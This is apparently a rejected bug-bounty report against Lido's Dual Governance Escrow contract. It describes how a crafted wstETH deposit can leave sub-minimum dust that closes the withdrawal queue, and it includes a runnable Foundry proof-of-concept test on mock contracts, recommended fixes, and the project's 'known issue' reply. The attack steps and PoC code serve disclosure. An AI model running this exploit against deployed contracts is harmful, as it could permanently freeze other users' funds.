[Not Paid]

## Conclusion

Lido answer:<br>
"Known Issue: 1-2 wei corner case"

What is the "1-2 wei corner case":

"The document states that because stETH balances are calculated from an underlying shares balance using integer division, there's a known rounding error. When you transfer 1 stETH, the contract actually converts this to shares, transfers the shares (which might be a rounded-down number), and then converts back to stETH on the recipient's side. This process can leave 1-2 wei behind. It's a fundamental characteristic of how stETH has worked for years."

My answer:

- I wanted to create "dust" to lock the queue.
- How did I create dust? By making a deposit (`lockWstETH`) that, when converted from `wstETH` to `stETH` and then to `shares`, created a remainder.
- The **root cause** of my attack was the exact same integer-division rounding that Lido has documented as a known issue.

In the world of bug bounties, if the **root cause** of a vulnerability is a documented and accepted "known issue," then even novel or creative impacts stemming from that root cause are almost always considered out of scope. I didn't find a new flaw; we found a new way to use an old, accepted one.

## **Description**

### **Vulnerability Title**

**Critical: Precision Loss in `calcRequestAmounts` Can Be Exploited to Permanently Freeze User Funds in `Escrow`**

### **Executive Summary**

A logic flaw in the `requestNextWithdrawalsBatch` function of `Escrow.sol` allows an unprivileged attacker to permanently lock a portion of user funds within the contract. The vulnerability stems from the interaction between the **intended precision loss** in the `WithdrawalsBatchesQueue.calcRequestAmounts` library and the state-closing mechanism in `requestNextWithdrawalsBatch`. An attacker can deposit a carefully calculated amount of `wstETH`, ensuring that after all full withdrawal batches are processed, the remaining "dust" amount is greater than zero but less than the minimum withdrawal threshold. This causes the `requestNextWithdrawalsBatch` function to prematurely and permanently close the withdrawal queue (`_batchesQueue.close()`), while user funds equal to the "dust" amount remain locked in the contract with no mechanism for recovery.

### **Vulnerability Details & Impact**

- **Vulnerability Description:**
  The core of the vulnerability lies in how `requestNextWithdrawalsBatch` handles the residual "dust" funds left over from the `calcRequestAmounts` calculation. The developers correctly intended for `calcRequestAmounts` to only process full batches, leaving a remainder. However, the `requestNextWithdrawalsBatch` function checks the contract's `stETH` balance after sending off the full batches for withdrawal. If this remaining balance (the dust) is below the `minWithdrawableStETHAmount`, the function permanently closes the withdrawal queue. This creates a state where the contract's internal accounting still shows users have funds to claim, but the mechanism to process these claims is irrevocably shut down.
- **Attack Vector:**
  The attack flow is demonstrated in the Proof of Concept. It is performed in a forked mainnet environment and does not affect any on-chain assets, in accordance with Immunefi's PoC guidelines.
  - **Prerequisites:**
    1. Lido's Dual Governance has entered the `RageQuitEscrow` state.
    2. The attacker, as an unprivileged user, can deposit `wstETH` into the `Escrow` contract alongside other honest users.
  - **Attack Steps:**
    1. **Crafted Deposit:** The attacker deposits a carefully calculated amount of `wstETH`. The goal is to manipulate the total `stETH` balance in the `Escrow` contract so that it is not a perfect multiple of the withdrawal batch size.
    2. **Trigger Withdrawal Processing:** An honest user or an automated script calls the `requestNextWithdrawalsBatch` function on `Escrow` to advance the RageQuit process.
    3. **Flaw Execution & Queue Closure:** The `Escrow` contract calls `calcRequestAmounts`, which, due to intended integer division, processes only the full batches and leaves the attacker's crafted amount behind as "dust". The function then sends the full batches to the `WithdrawalQueue`. Immediately after, it re-checks the contract balance, finds only the dust amount remaining (which is below the minimum withdrawal threshold), and proceeds to call `_batchesQueue.close()`, permanently shutting down the withdrawal mechanism.
- **Impact:**
  - The withdrawal queue (`_batchesQueue`) is permanently closed. Any subsequent calls to `requestNextWithdrawalsBatch` will fail.
  - The contract's state machine becomes permanently stuck. It can never fulfill the conditions required to enter the `RageQuitExtensionPeriod`.
  - Consequently, the `withdrawETH` function becomes forever unreachable for the portion of funds left as dust.
  - The result is a **Permanent freezing of funds**. While the attacker cannot steal the funds, they can intentionally cause a permanent, irrecoverable loss for other users whose funds constituted the "dust". This directly violates the protocol's core promise of fund safety.

### **Analysis of Mitigating Controls**

We have analyzed the project's documented emergency actions and their applicability to this vulnerability:

- **Protected Deployment Mode:** This control is considered **Ineffective**. The issue is a functional deadlock caused by flawed state management logic, not a timelock-related problem.
- **Tiebreaker Mechanism:** This control is considered **Ineffective**. The Tiebreaker is designed to bypass timelocks. It has no documented ability to reopen a closed `WithdrawalsBatchesQueue` or manually process funds from a contract that has reached a terminal state due to a logic flaw.

### **Recommendation**

We recommend implementing the following measures to mitigate this vulnerability:

1. **Modify the Queue Closing Logic:** The most direct fix is to change the logic in `requestNextWithdrawalsBatch`. The `_batchesQueue.close()` function should **only** be called when the `stETH` balance of the `Escrow` contract is exactly zero, not just below a threshold. This ensures that all funds are processed before the queue is closed.
2. **Implement a Dust Aggregation Mechanism:** A more robust solution would be to create a mechanism for handling dust. For example, if the remaining amount is below the minimum, it could be carried over and aggregated with the next withdrawal request in a subsequent batch, rather than being left stranded.
3. **Enhance the Tiebreaker Mechanism:** As a defense-in-depth measure, the Tiebreaker committee's powers could be expanded to include reopening a closed `WithdrawalsBatchesQueue` in such documented edge cases. This would provide a final safety net against similar logic flaws.

---

## **Proof of Concept**

### **Step-by-Step Explanation**

This PoC demonstrates how an attacker can exploit the intended precision loss to cause a permanent fund lock. The attack requires no special privileges.

**Context Necessary for Impact:**

1. The `Escrow` contract is in the `RageQuitEscrow` state.
2. The attacker can deposit assets alongside honest users.

**Attack Walkthrough:**

**Step 1: Attacker Deposits a Maliciously Crafted Amount**

An honest user (victim) deposits a large, standard amount (e.g., 2000 ether). The attacker deposits a small, carefully calculated amount (50 ether). Their goal is to control the total stETHRemaining in the contract, such that after full batches are processed, the remainder is small but non-zero.

_Pseudocode:_

\`victim.lockWstETH(2000e18);

attacker.lockWstETH(50e18);

// Total locked = 2050 ether\`

**Step 2: RageQuit Begins and requestNextWithdrawalsBatch is Called**

The dualGovernance address triggers the RageQuit process. Anyone then calls requestNextWithdrawalsBatch(100) to start processing withdrawals.

**Step 3: The Flawed Dust Handling is Triggered**

The function executes as follows, with stETHRemaining initially being 2050 ether:

- Inside `requestNextWithdrawalsBatch` (`Escrow.sol` 1):
  - The initial check `stETHRemaining < minWithdrawableStETHAmount` passes, as `2050 ether` is large.
  - The function calls `WithdrawalsBatchesQueue.calcRequestAmounts` with `remainingAmount = 2050 ether`.
  - **Inside `calcRequestAmounts` (`WithdrawalsBatchesQueue.sol`):**
    - `requestsCount = 2050 ether / 1000 ether` results in `2` (Integer division truncates the remainder).
    - `lastRequestAmount = 2050 ether - 2 * 1000 ether` results in `50 ether`.
    - The check `if (lastRequestAmount >= minRequestAmount)` (i.e., `50 ether >= 100 ether`) is **false**.
    - The function returns an array of amounts totaling `2000 ether`, effectively "forgetting" about the `50 ether` remainder.
  - **Back inside `requestNextWithdrawalsBatch`:**
    - The `2000 ether` is sent to the `WITHDRAWAL_QUEUE`.
    - The function then re-checks the balance: `stETHRemaining = ST_ETH.balanceOf(address(this))`, which is now `50 ether`.
    - The final, fatal check is performed: `if (stETHRemaining < minWithdrawableStETHAmount)` (i.e., `50 ether < 100 ether`) is now **true**.
    - `_batchesQueue.close()` is called. The withdrawal queue is now **permanently closed**.

**Step 4: Verifying the Permanent Lock**

At this point, 50 ether worth of shares are still recorded in the contract's accounting ledger, but the mechanism to process them is gone forever.

- The `isWithdrawalsBatchesClosed()` function will now always return `true`.
- Any subsequent calls to `requestNextWithdrawalsBatch` will revert because the queue is closed.
- The contract can never reach the `RageQuitExtensionPeriod`, so calling `withdrawETH` will always fail. The `50 ether` is permanently frozen.

### **Runnable PoC Code**

**Environment and Dependencies:**

- **Framework:** Foundry
- **Command:**`forge test --mp test/AttackEscrow_2.t.sol -vvvv`
- **Dependencies:**`forge-std`, `openzeppelin-contracts`

**`test/**AttackEscrow_2**.t.sol`:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// --- Forge/Foundry Imports ---
import {Test, console} from "../lib/forge-std/src/Test.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

// --- Lido Contract Imports ---
import {Escrow} from "../contracts/Escrow.sol";
import {EscrowState as EscrowStateLib, State as EscrowState} from "../contracts/libraries/EscrowState.sol";
import {WithdrawalsBatchesQueue} from "../contracts/libraries/WithdrawalsBatchesQueue.sol";
import {Duration, Durations} from "../contracts/types/Duration.sol";
import {IWithdrawalQueue} from "../contracts/interfaces/IWithdrawalQueue.sol";
import {IDualGovernance} from "../contracts/interfaces/IDualGovernance.sol";
import {IStETH} from "../contracts/interfaces/IStETH.sol";
import {IWstETH} from "../contracts/interfaces/IWstETH.sol";

// --- Mock Contract Imports ---
import {StETHMock} from "./mocks/StETHMock.sol";
import {WstETHMock} from "./mocks/WstETHMock.sol";
import {WithdrawalQueueMock} from "./mocks/WithdrawalQueueMock.sol";

// --- OpenZeppelin Imports ---
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EscrowAttackPoC is Test {
    // --- State Variables ---
    Escrow internal masterCopy;
    Escrow internal escrow; // This is the proxy contract we interact with.
    WithdrawalQueueMock internal withdrawalQueue;
    StETHMock internal stETH;
    WstETHMock internal wstETH;

    // --- Actors & Mock Addresses ---
    address internal immutable attacker = makeAddr("attacker");
    address internal immutable victim = makeAddr("victim");
    address internal immutable dualGovernanceAddress = makeAddr("dualGovernance");

    // --- Config ---
    Duration internal MIN_ASSETS_LOCK_DURATION;
    Duration internal MAX_MIN_ASSETS_LOCK_DURATION;

    // Attacker deposits an amount crafted to become dust.
    uint256 constant ATTACKER_DEPOSIT_AMOUNT = 50 ether;
    // Victim deposits a larger amount.
    uint256 constant VICTIM_DEPOSIT_AMOUNT = 2000 ether;

    function setUp() public {
        MIN_ASSETS_LOCK_DURATION = Durations.from(1 days);
        MAX_MIN_ASSETS_LOCK_DURATION = Durations.from(100 days);

        stETH = new StETHMock();
        wstETH = new WstETHMock(IStETH(address(stETH)));
        withdrawalQueue = new WithdrawalQueueMock(IERC20(address(stETH)));
        // Set withdrawal queue parameters to match the PoC scenario
        withdrawalQueue.setMinStETHWithdrawalAmount(100 ether);
        withdrawalQueue.setMaxStETHWithdrawalAmount(1000 ether);

        masterCopy = new Escrow(
            IStETH(address(stETH)),
            IWstETH(address(wstETH)),
            IWithdrawalQueue(address(withdrawalQueue)),
            IDualGovernance(dualGovernanceAddress),
            100,
            MAX_MIN_ASSETS_LOCK_DURATION
        );
        escrow = Escrow(payable(Clones.clone(address(masterCopy))));

        vm.prank(dualGovernanceAddress);
        escrow.initialize(MIN_ASSETS_LOCK_DURATION);

        // Mint and approve for both victim and attacker
        stETH.mint(victim, VICTIM_DEPOSIT_AMOUNT);
        vm.startPrank(victim);
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(VICTIM_DEPOSIT_AMOUNT);
        wstETH.approve(address(escrow), type(uint256).max);
        vm.stopPrank();

        stETH.mint(attacker, ATTACKER_DEPOSIT_AMOUNT);
        vm.startPrank(attacker);
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(ATTACKER_DEPOSIT_AMOUNT);
        wstETH.approve(address(escrow), type(uint256).max);
        vm.stopPrank();

        vm.mockCall(
            dualGovernanceAddress,
            abi.encodeWithSelector(IDualGovernance.activateNextState.selector),
            abi.encode(true)
        );
    }

    function test_Attack_LockDustFundsByPrematurelyClosingQueue() public {
        // === Step 1: Users deposit, creating a specific total amount ===
        vm.startPrank(victim);
        escrow.lockWstETH(wstETH.balanceOf(victim));
        vm.stopPrank();

        vm.startPrank(attacker);
        escrow.lockWstETH(wstETH.balanceOf(attacker));
        vm.stopPrank();

        uint totalDeposited = VICTIM_DEPOSIT_AMOUNT + ATTACKER_DEPOSIT_AMOUNT;
        console.log("Total Amount Locked: %s wei", totalDeposited); // Should be 2050 ether

        // === Step 2: RageQuit begins ===
        vm.prank(dualGovernanceAddress);
        escrow.startRageQuit(Durations.ZERO, Durations.ZERO);
        assertEq(uint(escrow.getEscrowState()), uint(EscrowState.RageQuitEscrow));
        console.log("--- RageQuit Started ---");

        // === Step 3: `requestNextWithdrawalsBatch` is called, triggering the flaw ===
        // The function will process 2000 ether and leave 50 ether as dust.
        // Then, it will see the 50 ether dust, find it's less than the 100 ether minimum,
        // and permanently close the withdrawal queue.
        console.log("Calling requestNextWithdrawalsBatch, expecting it to close the queue...");
        escrow.requestNextWithdrawalsBatch(100);

        // === Step 4: VERIFICATION - The queue is closed and the dust is locked ===
        console.log("--- VERIFICATION ---");

        // Core Assertion 1: The withdrawal queue is now permanently closed.
        assertTrue(escrow.isWithdrawalsBatchesClosed(), "Queue should be closed");
        console.log("SUCCESS: Withdrawal queue is confirmed to be permanently closed.");

        // Core Assertion 2: The remaining 50 ether are still in the contract.
        assertEq(stETH.balanceOf(address(escrow)), ATTACKER_DEPOSIT_AMOUNT, "Dust funds should remain in Escrow");
        console.log("SUCCESS: %s wei of dust are confirmed to be locked in the contract.", stETH.balanceOf(address(escrow)));

        // Final Assertion: Users cannot withdraw their remaining (dust) funds.
        vm.prank(attacker);
        vm.expectRevert(EscrowStateLib.RageQuitExtensionPeriodNotStarted.selector);
        escrow.withdrawETH();

        console.log("PoC Successful: User funds (dust) are PERMANENTLY LOCKED.");
    }
}
```
